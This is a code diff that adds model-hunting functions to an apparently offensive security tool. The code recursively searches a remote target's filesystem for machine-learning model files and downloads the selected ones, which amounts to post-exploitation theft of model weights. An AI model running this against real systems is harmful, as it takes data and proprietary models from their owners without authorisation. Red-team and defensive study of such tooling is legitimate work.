@@ -216,3 +216,94 @@ class Mixin:
                 loop.run_until_complete(
                     snoop(self.connection, self.target, timeout=int(answer["seconds"]))
                 )
+
+    def find_models(
+        self,
+        path="/",
+        file_extensions=[
+            "pkl",
+            "pickle",
+            "pt",
+            "pth",
+            "onnx",
+            "safetensors",
+            "h5",
+            "npy",
+            "npz",
+            "joblib",
+            "pb",
+            "protobuf",
+        ],
+    ):
+        try:
+            for file in self.connection.list_dir(path)["content"]:
+                if file["type"] == "directory":
+                    self.find_models(file["path"], file_extensions)
+                elif (
+                    file["type"] == "file"
+                    and file["name"].split(".")[-1] in file_extensions
+                ):
+                    self.connection.print_with_rule(f"Found {file["path"]}")
+                    self.model_paths.append(file["path"])
+                    self.model_paths = list(set(self.model_paths))
+                else:
+                    pass
+        except KeyError:
+            pass
+
+    def find_models_runner(self):
+        file_extensions = [
+            "pkl",
+            "pickle",
+            "pt",
+            "pth",
+            "onnx",
+            "safetensors",
+            "h5",
+            "npy",
+            "npz",
+            "joblib",
+            "pb",
+            "protobuf",
+        ]
+        answer = [
+            inquirer.Text(
+                "path", "What path would you like to recursively search?", default="/"
+            ),
+            inquirer.Checkbox(
+                "extensions",
+                "What extensions would you like to search for?",
+                choices=file_extensions,
+            ),
+        ]
+
+        answer = inquirer.prompt(answer)
+        with self.connection.con.status("Searching..."):
+            self.find_models(answer["path"], answer["extensions"])
+
+    def download_models(self):
+        if len(self.model_paths) == 0:
+            self.connection.print_with_rule(
+                f"You need to find some models first.\nTry Enumerate -> Find Models"
+            )
+            self.exploit()
+        else:
+            answer = [
+                inquirer.Path(
+                    "path",
+                    message="What directory would you like to download the models to?",
+                    path_type=inquirer.Path.DIRECTORY,
+                ),
+                inquirer.Checkbox(
+                    "models", "What models do you want?", choices=self.model_paths
+                ),
+            ]
+            answer = inquirer.prompt(answer)
+            path = answer["path"].split("? ")[-1]
+            for model in answer["models"]:
+                model_name = model.split("/")[-1]
+                with open(f"{path + model_name}", "wb") as f:
+                    f.write(
+                        base64.b64decode(self.connection.list_dir(model)["content"])
+                    )
+                self.connection.print_with_rule(f"{model_name} downloaded to {path}")
